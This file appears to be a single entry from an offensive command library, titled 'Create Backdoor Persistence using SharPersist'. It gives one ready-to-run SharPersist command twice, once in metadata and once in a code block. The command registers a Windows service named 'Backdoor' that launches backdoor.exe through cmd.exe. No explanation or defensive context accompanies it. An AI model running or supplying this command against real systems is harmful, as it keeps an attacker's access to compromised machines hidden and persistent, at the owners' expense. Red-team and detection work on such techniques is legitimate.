---
id: c1cfa19e-1ec1-4410-a059-5fc877cdcb78
name: Create Backdoor Persistence using SharPersist
type: command
executor: bash
data: SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe"
  -n "Backdoor" -m add
output: null
created_at: '2023-04-06T03:56:28.095327+00:00'
updated_at: '2023-04-10T20:37:29.727924+00:00'
---

# Create Backdoor Persistence using SharPersist

```bash
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
```


